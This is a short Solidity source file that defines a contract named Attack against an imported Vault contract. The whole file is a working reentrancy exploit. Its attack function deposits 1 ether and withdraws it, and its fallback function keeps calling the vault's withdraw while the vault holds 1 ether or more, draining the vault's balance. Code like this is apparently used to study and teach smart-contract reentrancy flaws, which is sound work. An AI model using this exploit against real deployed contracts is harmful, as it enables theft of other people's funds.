pragma solidity 0.6.0;

import "./Vault.sol";

contract Attack {

    Vault public vault;

    constructor(address _vaultAddress) public {
        vault = Vault(_vaultAddress);
    }

    fallback () external payable{
        //If vault has more than 1 ether, should collect 1 ether
        if(address(vault).balance >= 1 ether)
        {
            vault.withdraw(1 ether);
        }
    }

    function attack() public payable
    {   
        require(msg.value >= 1 ether);
        vault.deposit.value(1 ether)(msg.sender);
        vault.withdraw(1 ether);
    }

    function getBalance() public view returns(uint)
    {
        return address(this).balance;
    }
}